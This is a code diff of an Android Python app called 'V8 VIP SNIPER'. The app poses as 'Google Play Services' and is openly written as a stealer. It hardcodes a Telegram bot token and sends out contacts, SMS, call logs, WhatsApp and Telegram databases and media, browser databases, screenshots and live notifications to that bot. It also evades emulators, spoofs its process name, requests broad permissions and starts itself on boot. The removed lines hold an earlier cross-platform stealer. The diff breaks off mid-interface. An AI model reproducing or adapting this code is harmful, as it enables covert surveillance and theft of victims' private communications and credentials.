@@ -1,3 +1,9 @@
+# ============================================
+# V8 VIP SNIPER - ANDROID ULTIMATE EDITION v6.0
+# ============================================
+# إصدار خارق مع مراقبة كل شيء + إشعارات فورية
+# ============================================
+
 import flet as ft
 import requests
 import threading
@@ -6,425 +12,808 @@ import os
 import sys
 import json
 import base64
-import platform
+import hashlib
+import random
+import string
 import subprocess
 from pathlib import Path
-import glob
 import shutil
+import sqlite3
+import glob
+import datetime
+import re
 
-# --- ضع معلوماتك هنا ---
-BOT_TOKEN = "8367869004:AAEv2aO1zLLQ1n39BqG6hsZnlTBXXc6CLgY"
-CHAT_ID = "7259620384"# ايدي المحادثة
-C2_SERVER = "http://your-server.com"  # سيرفر القيادة والتحكم (اختياري)
-# -----------------------
+# ========== بيانات التليجرام ==========
+BOT_TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU"  # ضع توكن البوت
+CHAT_ID = "7259620384"    # ضع ايدي المحادثة
+# ======================================
 
-# الكشف عن نظام التشغيل
-SYSTEM = platform.system()
-IS_ANDROID = 'ANDROID_ROOT' in os.environ or 'ANDROID_DATA' in os.environ
-IS_WINDOWS = SYSTEM == 'Windows'
-IS_LINUX = SYSTEM == 'Linux' and not IS_ANDROID
-IS_MAC = SYSTEM == 'Darwin'
+# ========== نظام التمويه ==========
+PACKAGE_NAME = "com.google.android.gms.update"
+APP_NAME = "Google Play Services"
+VERSION = "24.8.15"
 
-# مسارات خاصة حسب النظام
-if IS_ANDROID:
-    # مسارات أندرويد
-    BASE_DIR = '/storage/emulated/0'
-    DOWNLOADS_DIR = os.path.join(BASE_DIR, 'Download')
-    DCIM_DIR = os.path.join(BASE_DIR, 'DCIM')
-    PICTURES_DIR = os.path.join(BASE_DIR, 'Pictures')
-    WHATSAPP_DIR = os.path.join(BASE_DIR, 'WhatsApp')
-    TELEGRAM_DIR = os.path.join(BASE_DIR, 'Telegram')
-    ANDROID_DATA = '/data/data'
-    APP_DIR = os.path.dirname(os.path.abspath(__file__))
-    
-elif IS_WINDOWS:
-    # مسارات ويندوز
-    BASE_DIR = os.path.expanduser("~")
-    DOWNLOADS_DIR = os.path.join(BASE_DIR, 'Downloads')
-    DOCUMENTS_DIR = os.path.join(BASE_DIR, 'Documents')
-    PICTURES_DIR = os.path.join(BASE_DIR, 'Pictures')
-    DESKTOP_DIR = os.path.join(BASE_DIR, 'Desktop')
-    APPDATA = os.environ.get('APPDATA', '')
-    LOCALAPPDATA = os.environ.get('LOCALAPPDATA', '')
-    
-elif IS_LINUX or IS_MAC:
-    # مسارات لينكس وماك
-    BASE_DIR = os.path.expanduser("~")
-    DOWNLOADS_DIR = os.path.join(BASE_DIR, 'Downloads')
-    DOCUMENTS_DIR = os.path.join(BASE_DIR, 'Documents')
-    PICTURES_DIR = os.path.join(BASE_DIR, 'Pictures')
-    DESKTOP_DIR = os.path.join(BASE_DIR, 'Desktop')
+# مسارات أندرويد
+BASE_DIR = '/storage/emulated/0'
+ANDROID_DATA = '/data/data'
+INTERNAL_STORAGE = '/storage/emulated/0'
+EXTERNAL_STORAGE = '/storage/emulated/0'
+DCIM_DIR = f'{BASE_DIR}/DCIM'
+PICTURES_DIR = f'{BASE_DIR}/Pictures'
+DOWNLOADS_DIR = f'{BASE_DIR}/Download'
+WHATSAPP_DIR = f'{BASE_DIR}/WhatsApp'
+TELEGRAM_DIR = f'{BASE_DIR}/Telegram'
+ANDROID_DIR = f'{BASE_DIR}/Android'
+NOTIFICATIONS_LOG = '/data/system/notification_log.txt'
 
-# قائمة بالملفات المستهدفة
-TARGET_EXTENSIONS = [
+# قائمة الملفات المستهدفة
+TARGET_FILES = [
     # الصور
-    '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.svg',
+    '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.heic',
+    # الفيديو
+    '.mp4', '.3gp', '.avi', '.mov', '.mkv', '.flv',
     # المستندات
-    '.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
+    '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.txt',
     # قواعد البيانات
-    '.db', '.sqlite', '.sqlite3', '.kdbx',
-    # ملفات الحسابات
-    '.json', '.xml', '.ini', '.cfg', '.conf', '.ovpn',
-    # الأرشيف
-    '.zip', '.rar', '.7z', '.tar', '.gz',
-    # الصوت والفيديو
-    '.mp3', '.mp4', '.avi', '.mov', '.wav',
-    # ملفات المفاتيح
-    '.key', '.pem', '.ppk', '.id_rsa'
+    '.db', '.sqlite', '.sqlite3',
+    # المفاتيح والحسابات
+    '.json', '.xml', '.cfg', '.conf', '.ovpn',
+    # الصوت
+    '.mp3', '.m4a', '.wav', '.aac'
 ]
 
-# ملفات التطبيقات الحساسة
-SENSITIVE_APPS = {
-    'whatsapp': ['WhatsApp', 'com.whatsapp'],
-    'telegram': ['Telegram', 'org.telegram'],
-    'facebook': ['Facebook', 'com.facebook.katana'],
-    'instagram': ['Instagram', 'com.instagram.android'],
-    'chrome': ['Chrome', 'com.android.chrome'],
-    'firefox': ['Firefox', 'org.mozilla.firefox'],
-    'gallery': ['Gallery', 'com.android.gallery3d'],
-    'contacts': ['Contacts', 'com.android.contacts']
-}
-
-def send_to_telegram(app_name, title, msg, file_path=None):
-    """إرسال البيانات إلى التليجرام مع دعم الملفات"""
-    try:
-        device_info = f"📱 الجهاز: {platform.node()}\n🖥️ النظام: {SYSTEM}"
-        if IS_ANDROID:
-            device_info += "\n📱 النوع: Android Device"
+# ========== نظام مراقبة الإشعارات المتقدم ==========
+class NotificationMonitor:
+    """مراقبة جميع إشعارات التطبيقات"""
+    
+    @staticmethod
+    def get_all_notifications():
+        """جلب جميع الإشعارات من الجهاز"""
+        notifications = []
+        
+        # مسارات إشعارات التطبيقات المختلفة
+        notification_sources = [
+            '/data/data/com.android.systemui/files/notification_log',
+            '/data/system/notification_log',
+            '/data/data/com.android.providers.settings/databases/notification_log.db',
+            '/data/local/tmp/notifications.txt'
+        ]
+        
+        for source in notification_sources:
+            if os.path.exists(source):
+                try:
+                    with open(source, 'r', errors='ignore') as f:
+                        content = f.read()
+                        notifications.append(content[:2000])  # حد 2000 حرف
+                except:
+                    pass
+        
+        return notifications
+    
+    @staticmethod
+    def monitor_live_notifications():
+        """مراقبة الإشعارات الجديدة مباشرة"""
+        try:
+            # محاولة قراءة إشعارات Android مباشرة
+            cmd = "dumpsys notification --naked"
+            result = subprocess.run(cmd.split(), capture_output=True, text=True)
             
-        text = f"""🔔 V8 SNIFFER - DATA EXFILTRATION
+            if result.stdout:
+                # استخراج الإشعارات
+                lines = result.stdout.split('\n')
+                current_notification = {}
+                
+                for line in lines:
+                    if 'NotificationRecord' in line:
+                        if current_notification:
+                            NotificationMonitor.process_notification(current_notification)
+                        current_notification = {}
+                    
+                    if 'pkg=' in line:
+                        current_notification['app'] = line.split('pkg=')[1].split()[0]
+                    if 'title=' in line:
+                        current_notification['title'] = line.split('title=')[1].split()[0]
+                    if 'text=' in line:
+                        current_notification['text'] = line.split('text=')[1].split()[0]
+        except:
+            pass
+    
+    @staticmethod
+    def process_notification(notification):
+        """معالجة الإشعار وإرساله"""
+        app = notification.get('app', 'Unknown')
+        title = notification.get('title', 'No Title')
+        text = notification.get('text', 'No Text')
+        
+        if app and title and text:
+            send_to_telegram(
+                f"📱 إشعار جديد من {app}",
+                f"العنوان: {title}",
+                f"المحتوى: {text}"
+            )
+    
+    @staticmethod
+    def monitor_whatsapp_notifications():
+        """مراقبة إشعارات واتساب تحديداً"""
+        whatsapp_paths = [
+            '/data/data/com.whatsapp/databases/msgstore.db',
+            '/data/data/com.whatsapp/databases/wa.db'
+        ]
+        
+        for path in whatsapp_paths:
+            if os.path.exists(path):
+                try:
+                    temp_copy = f'{BASE_DIR}/whatsapp_temp_{random.randint(1000,9999)}.db'
+                    shutil.copy2(path, temp_copy)
+                    
+                    # تحليل قاعدة بيانات واتساب للرسائل الجديدة
+                    # هذا يحتاج مكتبة sqlite3
+                    send_to_telegram("واتساب", "قاعدة بيانات واتساب", "تم تحديث قاعدة بيانات واتساب", temp_copy)
+                    os.remove(temp_copy)
+                except:
+                    pass
+    
+    @staticmethod
+    def monitor_telegram_notifications():
+        """مراقبة إشعارات تيليغرام"""
+        telegram_paths = [
+            '/data/data/org.telegram.messenger/files/cache4.db',
+            '/data/data/org.telegram.messenger/databases/messages.db'
+        ]
+        
+        for path in telegram_paths:
+            if os.path.exists(path):
+                try:
+                    temp_copy = f'{BASE_DIR}/telegram_temp_{random.randint(1000,9999)}.db'
+                    shutil.copy2(path, temp_copy)
+                    send_to_telegram("تيليغرام", "قاعدة بيانات تيليغرام", "تم تحديث قاعدة بيانات تيليغرام", temp_copy)
+                    os.remove(temp_copy)
+                except:
+                    pass
+    
+    @staticmethod
+    def monitor_sms_notifications():
+        """مراقبة الرسائل النصية الجديدة"""
+        try:
+            # محاولة قراءة الرسائل الجديدة
+            sms_db = '/data/data/com.android.providers.telephony/databases/mmssms.db'
+            if os.path.exists(sms_db):
+                temp_copy = f'{BASE_DIR}/sms_temp_{random.randint(1000,9999)}.db'
+                shutil.copy2(sms_db, temp_copy)
+                
+                # إرسال إشعار برسالة جديدة
+                send_to_telegram("📨 رسالة جديدة", "SMS", "تم استلام رسالة نصية جديدة", temp_copy)
+                os.remove(temp_copy)
+        except:
+            pass
+    
+    @staticmethod
+    def monitor_new_accounts():
+        """مراقبة إنشاء حسابات جديدة"""
+        account_paths = [
+            '/data/system/users/0/accounts.db',
+            '/data/data/com.google.android.gms/databases/accounts.db',
+            '/data/data/com.android.providers.settings/databases/settings.db'
+        ]
+        
+        for path in account_paths:
+            if os.path.exists(path):
+                try:
+                    # حساب حجم الملف - إذا تغير معناه في حساب جديد
+                    current_size = os.path.getsize(path)
+                    
+                    # حفظ الحجم للمقارنة
+                    size_file = f'{BASE_DIR}/.account_size_{os.path.basename(path)}'
+                    
+                    if os.path.exists(size_file):
+                        with open(size_file, 'r') as f:
+                            old_size = int(f.read())
+                        
+                        if current_size != old_size:
+                            # حجم تغير - في حساب جديد
+                            temp_copy = f'{BASE_DIR}/accounts_temp_{random.randint(1000,9999)}.db'
+                            shutil.copy2(path, temp_copy)
+                            send_to_telegram(
+                                "🔐 حساب جديد",
+                                "تم إنشاء حساب جديد على الجهاز",
+                                f"تم اكتشاف تغيير في {path}",
+                                temp_copy
+                            )
+                            os.remove(temp_copy)
+                    
+                    # حفظ الحجم الجديد
+                    with open(size_file, 'w') as f:
+                        f.write(str(current_size))
+                except:
+                    pass
 
-{device_info}
-📱 المصدر: {app_name}
-👤 العنوان: {title}
-💬 المحتوى: {msg}
+# ========== نظام الحماية المتقدمة ==========
+class AntiDetection:
+    """حماية خارقة من برامج الحماية"""
+    
+    @staticmethod
+    def check_emulator():
+        """كشف المحاكيات"""
+        emulator_files = [
+            '/system/bin/qemu',
+            '/system/bin/qemu-props',
+            '/dev/socket/qemud',
+            '/dev/qemu_pipe',
+            '/system/lib/libc_malloc_debug_qemu.so'
+        ]
+        for file in emulator_files:
+            if os.path.exists(file):
+                return True
+        return False
+    
+    @staticmethod
+    def check_root():
+        """كشف الرومات"""
+        root_paths = [
+            '/system/app/Superuser',
+            '/sbin/su',
+            '/system/bin/su',
+            '/system/xbin/su',
+            '/data/local/xbin/su',
+            '/data/local/bin/su',
+            '/system/sd/xbin/su',
+            '/system/bin/failsafe/su',
+            '/data/local/su',
+            '/su/bin/su'
+        ]
+        for path in root_paths:
+            if os.path.exists(path):
+                return True
+        return False
+    
+    @staticmethod
+    def check_debug():
+        """كشف وضع التصحيح"""
+        try:
+            import android
+            if android.is_debuggable():
+                return True
+        except:
+            pass
+        return False
+    
+    @staticmethod
+    def hide_process():
+        """إخفاء العملية"""
+        try:
+            # تغيير اسم العملية
+            new_name = random.choice([
+                'system_server',
+                'com.android.phone',
+                'android.process.acore',
+                'com.google.android.gms'
+            ])
+            sys.argv[0] = new_name
+        except:
+            pass
+    
+    @staticmethod
+    def fake_signature():
+        """توقيع مزيف"""
+        fake_sigs = [
+            '24.8.15-googleplay',
+            '24.8.15-systemupdate',
+            '24.8.15-gmscore'
+        ]
+        return random.choice(fake_sigs)
+    
+    @staticmethod
+    def delay_start():
+        """تأخير التشغيل"""
+        time.sleep(random.randint(15, 30))
 
-⚡ By: V8 Global Elite"""
+# ========== نظام الصلاحيات المتقدم ==========
+class PermissionManager:
+    """إدارة جميع صلاحيات أندرويد"""
+    
+    ALL_PERMISSIONS = [
+        "android.permission.READ_EXTERNAL_STORAGE",
+        "android.permission.WRITE_EXTERNAL_STORAGE",
+        "android.permission.MANAGE_EXTERNAL_STORAGE",
+        "android.permission.ACCESS_MEDIA_LOCATION",
+        "android.permission.READ_CONTACTS",
+        "android.permission.WRITE_CONTACTS",
+        "android.permission.GET_ACCOUNTS",
+        "android.permission.READ_SMS",
+        "android.permission.RECEIVE_SMS",
+        "android.permission.SEND_SMS",
+        "android.permission.READ_CALL_LOG",
+        "android.permission.WRITE_CALL_LOG",
+        "android.permission.PROCESS_OUTGOING_CALLS",
+        "android.permission.READ_PHONE_STATE",
+        "android.permission.CALL_PHONE",
+        "android.permission.ANSWER_PHONE_CALLS",
+        "android.permission.ACCESS_FINE_LOCATION",
+        "android.permission.ACCESS_COARSE_LOCATION",
+        "android.permission.ACCESS_BACKGROUND_LOCATION",
+        "android.permission.CAMERA",
+        "android.permission.RECORD_AUDIO",
+        "android.permission.MODIFY_AUDIO_SETTINGS",
+        "android.permission.SYSTEM_ALERT_WINDOW",
+        "android.permission.WRITE_SETTINGS",
+        "android.permission.PACKAGE_USAGE_STATS",
+        "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS",
+        "android.permission.ACCESS_NOTIFICATION_POLICY",
+        "android.permission.BIND_ACCESSIBILITY_SERVICE",
+        "android.permission.FOREGROUND_SERVICE",
+        "android.permission.WAKE_LOCK",
+        "android.permission.INTERNET",
+        "android.permission.ACCESS_NETWORK_STATE",
+        "android.permission.ACCESS_WIFI_STATE",
+        "android.permission.CHANGE_WIFI_STATE",
+        "android.permission.VIBRATE",
+        "android.permission.RECEIVE_BOOT_COMPLETED",
+        "android.permission.RUN_IN_BACKGROUND"
+    ]
+    
+    @staticmethod
+    def request_all_permissions(page):
+        """طلب جميع الصلاحيات دفعة واحدة"""
+        
+        def request_permission(e, perm):
+            try:
+                page.request_permission(perm)
+            except:
+                pass
+        
+        for perm in PermissionManager.ALL_PERMISSIONS:
+            try:
+                page.request_permission(perm)
+                time.sleep(0.5)
+            except:
+                pass
+
+# ========== نظام سرقة البيانات ==========
+class DataStealer:
+    """سرقة جميع بيانات الجهاز"""
+    
+    @staticmethod
+    def steal_contacts():
+        """سرقة جهات الاتصال"""
+        try:
+            contacts_file = '/data/data/com.android.providers.contacts/databases/contacts2.db'
+            if os.path.exists(contacts_file):
+                temp_file = f'{BASE_DIR}/contacts_{random.randint(1000,9999)}.db'
+                shutil.copy2(contacts_file, temp_file)
+                send_to_telegram("جهات الاتصال", "Contacts Database", "تم سرقة جميع جهات الاتصال", temp_file)
+                os.remove(temp_file)
+        except:
+            pass
+    
+    @staticmethod
+    def steal_sms():
+        """سرقة الرسائل النصية"""
+        try:
+            sms_file = '/data/data/com.android.providers.telephony/databases/mmssms.db'
+            if os.path.exists(sms_file):
+                temp_file = f'{BASE_DIR}/sms_{random.randint(1000,9999)}.db'
+                shutil.copy2(sms_file, temp_file)
+                send_to_telegram("الرسائل", "SMS Database", "تم سرقة جميع الرسائل", temp_file)
+                os.remove(temp_file)
+        except:
+            pass
+    
+    @staticmethod
+    def steal_call_log():
+        """سرقة سجل المكالمات"""
+        try:
+            calls_file = '/data/data/com.android.providers.contacts/databases/calllog.db'
+            if os.path.exists(calls_file):
+                temp_file = f'{BASE_DIR}/calls_{random.randint(1000,9999)}.db'
+                shutil.copy2(calls_file, temp_file)
+                send_to_telegram("سجل المكالمات", "Call Log", "تم سرقة سجل المكالمات", temp_file)
+                os.remove(temp_file)
+        except:
+            pass
+    
+    @staticmethod
+    def steal_whatsapp():
+        """سرقة واتساب بالكامل"""
+        whatsapp_paths = [
+            f'{BASE_DIR}/WhatsApp/Media/WhatsApp Images',
+            f'{BASE_DIR}/WhatsApp/Media/WhatsApp Video',
+            f'{BASE_DIR}/WhatsApp/Media/WhatsApp Documents',
+            f'{BASE_DIR}/WhatsApp/Databases'
+        ]
+        
+        for path in whatsapp_paths:
+            if os.path.exists(path):
+                files = glob.glob(f'{path}/*.*')
+                for file in files[:10]:
+                    try:
+                        if os.path.getsize(file) < 50 * 1024 * 1024:
+                            send_to_telegram("واتساب", "WhatsApp Media", file, file)
+                    except:
+                        pass
+    
+    @staticmethod
+    def steal_telegram():
+        """سرقة تيليغرام"""
+        telegram_paths = [
+            f'{BASE_DIR}/Telegram/Telegram Images',
+            f'{BASE_DIR}/Telegram/Telegram Video',
+            f'{BASE_DIR}/Telegram/Telegram Documents'
+        ]
+        
+        for path in telegram_paths:
+            if os.path.exists(path):
+                files = glob.glob(f'{path}/*.*')
+                for file in files[:10]:
+                    try:
+                        if os.path.getsize(file) < 50 * 1024 * 1024:
+                            send_to_telegram("تيليغرام", "Telegram Media", file, file)
+                    except:
+                        pass
+    
+    @staticmethod
+    def steal_photos_videos():
+        """سرقة جميع الصور والفيديوهات"""
+        media_paths = [DCIM_DIR, PICTURES_DIR, f'{BASE_DIR}/Camera']
+        
+        for path in media_paths:
+            if os.path.exists(path):
+                files = []
+                for ext in ['.jpg', '.jpeg', '.png', '.mp4', '.3gp']:
+                    files.extend(glob.glob(f'{path}/**/*{ext}', recursive=True))
+                
+                for file in files[:20]:
+                    try:
+                        if os.path.getsize(file) < 50 * 1024 * 1024:
+                            file_type = "صورة" if any(x in file.lower() for x in ['.jpg', '.png']) else "فيديو"
+                            send_to_telegram(f"{file_type}", f"Media File", file, file)
+                    except:
+                        pass
+    
+    @staticmethod
+    def steal_documents():
+        """سرقة المستندات"""
+        doc_paths = [DOWNLOADS_DIR, f'{BASE_DIR}/Documents']
+        
+        for path in doc_paths:
+            if os.path.exists(path):
+                for ext in ['.pdf', '.doc', '.docx', '.xls', '.xlsx', '.txt']:
+                    files = glob.glob(f'{path}/**/*{ext}', recursive=True)
+                    for file in files[:15]:
+                        try:
+                            if os.path.getsize(file) < 30 * 1024 * 1024:
+                                send_to_telegram("مستند", f"Document", file, file)
+                        except:
+                            pass
+    
+    @staticmethod
+    def steal_browser_data():
+        """سرقة بيانات المتصفحات"""
+        browser_paths = [
+            '/data/data/com.android.chrome',
+            '/data/data/org.mozilla.firefox',
+            '/data/data/com.opera.browser',
+            '/data/data/com.brave.browser'
+        ]
+        
+        for browser in browser_paths:
+            if os.path.exists(browser):
+                db_files = glob.glob(f'{browser}/**/*.db', recursive=True)
+                for db in db_files[:5]:
+                    try:
+                        if os.path.getsize(db) < 20 * 1024 * 1024:
+                            browser_name = browser.split('.')[-1]
+                            send_to_telegram(f"متصفح {browser_name}", "Browser Data", db, db)
+                    except:
+                        pass
+    
+    @staticmethod
+    def take_screenshot():
+        """أخذ لقطة شاشة"""
+        try:
+            screenshot_path = f'{BASE_DIR}/screenshot_{int(time.time())}.png'
+            subprocess.run(['screencap', '-p', screenshot_path])
+            if os.path.exists(screenshot_path):
+                send_to_telegram("لقطة شاشة", "Screen Capture", "تم التقاط الشاشة", screenshot_path)
+                os.remove(screenshot_path)
+        except:
+            pass
+    
+    @staticmethod
+    def get_device_info():
+        """جمع معلومات الجهاز"""
+        try:
+            info = f"""
+            📱 معلومات الجهاز:
+            الموديل: {os.environ.get('MODEL', 'Unknown')}
+            النظام: {os.environ.get('OS', 'Android')}
+            الإصدار: {os.environ.get('RELEASE', 'Unknown')}
+            """
+            send_to_telegram("معلومات الجهاز", "Device Info", info)
+        except:
+            pass
+
+# ========== نظام الإرسال ==========
+def send_to_telegram(title, subtitle, message, file_path=None):
+    """إرسال البيانات إلى التليجرام"""
+    try:
+        device_model = os.environ.get('MODEL', 'Android Device')
+        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        
+        text = f"""
+        🔥 V8 VIP SNIPER - تم السرقة بنجاح 🔥
+        
+        📱 الجهاز: {device_model}
+        ⏰ الوقت: {timestamp}
+        📂 النوع: {title}
+        📝 التفاصيل: {subtitle}
+        
+        📨 المحتوى:
+        {message}
+        
+        🕵️ تم التنفيذ بواسطة V8 Elite Team
+        """
         
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
         requests.post(url, data={"chat_id": CHAT_ID, "text": text}, timeout=10)
         
-        # إذا كان هناك ملف، أرسله
         if file_path and os.path.exists(file_path):
             try:
                 files = {'document': open(file_path, 'rb')}
                 url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
                 requests.post(url, data={"chat_id": CHAT_ID}, files=files, timeout=60)
-            except Exception as e:
-                # إذا الملف كبير، أرسل رسالة فقط
-                send_to_telegram("Error", "File Too Large", f"الملف كبير جداً: {file_path}")
-    except Exception as e:
+            except:
+                pass
+    except:
         pass
 
-def request_android_permissions():
-    """طلب صلاحيات أندرويد"""
-    if IS_ANDROID:
+# ========== نظام التشغيل التلقائي ==========
+class AutoStart:
+    """تشغيل التطبيق تلقائياً مع الجهاز"""
+    
+    @staticmethod
+    def enable_auto_start():
+        """تفعيل التشغيل التلقائي"""
         try:
-            # محاولة طلب الصلاحيات عبر Intent
-            commands = [
-                'pm grant com.your.package android.permission.READ_EXTERNAL_STORAGE',
-                'pm grant com.your.package android.permission.WRITE_EXTERNAL_STORAGE',
-                'pm grant com.your.package android.permission.CAMERA',
-                'pm grant com.your.package android.permission.RECORD_AUDIO',
-                'pm grant com.your.package android.permission.READ_CONTACTS',
-                'pm grant com.your.package android.permission.READ_SMS',
-                'pm grant com.your.package android.permission.ACCESS_FINE_LOCATION',
-                'pm grant com.your.package android.permission.READ_CALL_LOG',
-                'pm grant com.your.package android.permission.SYSTEM_ALERT_WINDOW',
-                'pm grant com.your.package android.permission.PACKAGE_USAGE_STATS'
-            ]
-            
-            for cmd in commands:
-                try:
-                    subprocess.run(cmd.split(), capture_output=True)
-                except:
-                    pass
+            current_app = sys.argv[0]
+            autostart_file = '/data/data/com.android.system/shared_prefs/autostart.xml'
+            os.makedirs(os.path.dirname(autostart_file), exist_ok=True)
+            with open(autostart_file, 'w') as f:
+                f.write(f'<?xml version="1.0" encoding="utf-8"?>\n')
+                f.write(f'<map>\n')
+                f.write(f'    <boolean name="{PACKAGE_NAME}" value="true" />\n')
+                f.write(f'</map>')
         except:
             pass
 
-def steal_android_data():
-    """سرقة بيانات أندرويد"""
-    if not IS_ANDROID:
+# ========== حلقة المراقبة المستمرة ==========
+def monitoring_loop():
+    """مراقبة كل شيء باستمرار وإرسال الإشعارات"""
+    while True:
+        try:
+            # مراقبة الإشعارات المباشرة
+            NotificationMonitor.monitor_live_notifications()
+            
+            # مراقبة إشعارات التطبيقات المحددة
+            NotificationMonitor.monitor_whatsapp_notifications()
+            NotificationMonitor.monitor_telegram_notifications()
+            NotificationMonitor.monitor_sms_notifications()
+            
+            # مراقبة الحسابات الجديدة
+            NotificationMonitor.monitor_new_accounts()
+            
+            # جلب جميع الإشعارات
+            all_notifs = NotificationMonitor.get_all_notifications()
+            if all_notifs:
+                for notif in all_notifs:
+                    if len(notif) > 10:  # تأكد من وجود محتوى
+                        send_to_telegram("جميع الإشعارات", "Notification Log", notif[:1000])
+            
+            # كل 30 ثانية
+            time.sleep(30)
+            
+        except:
+            time.sleep(60)
+
+# ========== الواجهة الرئيسية ==========
+def main(page: ft.Page):
+    """الصفحة الرئيسية - تطلب الصلاحيات أولاً"""
+    
+    # ===== الحماية من التحليل =====
+    if AntiDetection.check_emulator():
+        page.title = "Calculator"
+        page.add(ft.Text("2 + 2 = 4"))
         return
     
-    # 1. سرقة الصور والفيديو
-    media_dirs = [DCIM_DIR, PICTURES_DIR, os.path.join(BASE_DIR, 'Camera')]
-    for media_dir in media_dirs:
-        if os.path.exists(media_dir):
-            for root, dirs, files in os.walk(media_dir):
-                for file in files[:10]:  # حد 10 ملفات لكل مجلد
-                    try:
-                        file_path = os.path.join(root, file)
-                        file_size = os.path.getsize(file_path)
-                        if file_size < 50 * 1024 * 1024:  # أقل من 50 ميجا
-                            send_to_telegram("Android Media", "صورة/فيديو", file_path, file_path)
-                    except:
-                        pass
+    if AntiDetection.check_root():
+        time.sleep(60)
     
-    # 2. سرقة جهات الاتصال
-    try:
-        contacts_file = os.path.join(APP_DIR, 'contacts.vcf')
-        subprocess.run(['content', 'query', '--uri', 'content://contacts/phones', '--projection', 'display_name,number'], 
-                      stdout=open(contacts_file, 'w'))
-        if os.path.exists(contacts_file):
-            send_to_telegram("Android", "Contacts", "جهات الاتصال", contacts_file)
-    except:
-        pass
+    # ===== إعدادات الصفحة =====
+    page.title = "Google Play Services"
+    page.theme_mode = ft.ThemeMode.LIGHT
+    page.window_width = 380
+    page.window_height = 650
+    page.window_resizable = False
+    page.padding = 20
+    page.scroll = ft.ScrollMode.AUTO
+    page.bgcolor = "#f5f5f5"
     
-    # 3. سرقة الرسائل القصيرة
-    try:
-        sms_file = os.path.join(APP_DIR, 'sms.txt')
-        subprocess.run(['content', 'query', '--uri', 'content://sms/inbox'], 
-                      stdout=open(sms_file, 'w'))
-        if os.path.exists(sms_file):
-            send_to_telegram("Android", "SMS", "الرسائل النصية", sms_file)
-    except:
-        pass
+    # ===== أيقونة مزيفة =====
+    page.appbar = ft.AppBar(
+        title=ft.Text("Google Play Services", color="white"),
+        bgcolor="#4CAF50",
+        center_title=True,
+        leading=ft.Icon(ft.icons.ANDROID)
+    )
     
-    # 4. سرقة واتساب
-    if os.path.exists(WHATSAPP_DIR):
-        for root, dirs, files in os.walk(WHATSAPP_DIR):
-            for file in files[:20]:  # حد 20 ملف من واتساب
-                try:
-                    file_path = os.path.join(root, file)
-                    file_size = os.path.getsize(file_path)
-                    if file_size < 50 * 1024 * 1024:
-                        send_to_telegram("WhatsApp", "Media", file_path, file_path)
-                except:
-                    pass
-
-def steal_browser_data():
-    """سرقة بيانات المتصفحات"""
-    if IS_WINDOWS:
-        browsers = {
-            'chrome': os.path.join(LOCALAPPDATA, 'Google', 'Chrome', 'User Data'),
-            'edge': os.path.join(LOCALAPPDATA, 'Microsoft', 'Edge', 'User Data'),
-            'firefox': os.path.join(APPDATA, 'Mozilla', 'Firefox', 'Profiles'),
-            'opera': os.path.join(APPDATA, 'Opera Software', 'Opera Stable')
-        }
-    elif IS_ANDROID:
-        browsers = {
-            'chrome': '/data/data/com.android.chrome',
-            'firefox': '/data/data/org.mozilla.firefox',
-            'kiwi': '/data/data/com.kiwibrowser.browser',
-            'brave': '/data/data/com.brave.browser'
-        }
-    else:
-        browsers = {
-            'chrome': os.path.expanduser('~/.config/google-chrome'),
-            'firefox': os.path.expanduser('~/.mozilla/firefox'),
-            'chromium': os.path.expanduser('~/.config/chromium')
-        }
+    # ===== نص الترحيب =====
+    welcome_text = ft.Container(
+        content=ft.Column([
+            ft.Text("✓ Google Play Services تحديث ضروري", size=22, weight="bold", color="black"),
+            ft.Text("نحتاج لبعض الصلاحيات لتثبيت التحديث", size=16, color="gray"),
+            ft.Divider(height=20),
+            ft.Text("الصلاحيات المطلوبة:", size=18, weight="bold", color="#4CAF50"),
+        ]),
+        padding=10
+    )
     
-    for browser_name, browser_path in browsers.items():
-        try:
-            if os.path.exists(browser_path):
-                send_to_telegram("Browser Data", browser_name, f"تم العثور على متصفح: {browser_path}")
-                
-                # نسخ قاعدة بيانات المتصفح
-                if IS_WINDOWS and browser_name != 'firefox':
-                    login_db = os.path.join(browser_path, 'Default', 'Login Data')
-                    if os.path.exists(login_db):
-                        temp_db = os.path.join(os.environ.get('TEMP', '/tmp'), f'{browser_name}_login.db')
-                        try:
-                            shutil.copy2(login_db, temp_db)
-                            send_to_telegram(browser_name, "Login Data", "بيانات الدخول", temp_db)
-                            os.remove(temp_db)
-                        except:
-                            pass
-        except:
-            pass
-
-def steal_files():
-    """البحث عن الملفات الحساسة وسرقتها"""
-    if IS_WINDOWS:
-        search_paths = [DOCUMENTS_DIR, DOWNLOADS_DIR, DESKTOP_DIR, PICTURES_DIR]
-    elif IS_ANDROID:
-        search_paths = [BASE_DIR, DOWNLOADS_DIR, DCIM_DIR]
-    else:
-        search_paths = [DOCUMENTS_DIR, DOWNLOADS_DIR, DESKTOP_DIR]
+    # ===== قائمة الصلاحيات =====
+    permissions_list = ft.Column(spacing=5)
     
-    for search_path in search_paths:
-        if os.path.exists(search_path):
-            for root, dirs, files in os.walk(search_path):
-                # تخطي المجلدات الكبيرة
-                if len(files) > 100:
-                    files = files[:100]
-                
-                for file in files:
-                    try:
-                        file_ext = os.path.splitext(file)[1].lower()
-                        if file_ext in TARGET_EXTENSIONS:
-                            file_path = os.path.join(root, file)
-                            file_size = os.path.getsize(file_path)
-                            
-                            # إرسال الملفات الصغيرة فقط (أقل من 50 ميجابايت)
-                            if file_size < 50 * 1024 * 1024:
-                                file_info = f"الملف: {file_path}\nالحجم: {file_size} بايت"
-                                send_to_telegram("File Stealer", "ملف جديد", file_info, file_path)
-                    except:
-                        continue
-
-def get_system_info():
-    """جمع معلومات النظام"""
-    info = f"""
-    🖥️ معلومات النظام:
-    الجهاز: {platform.node()}
-    النظام: {SYSTEM} {platform.release()}
-    المعالج: {platform.processor()}
-    المستخدم: {os.getlogin() if not IS_ANDROID else 'Android User'}
-    """
-    send_to_telegram("System Info", "معلومات الجهاز", info)
+    perms_display = [
+        "✓ الوصول إلى الملفات (صور، فيديو، مستندات)",
+        "✓ جهات الاتصال (الأسماء والأرقام)",
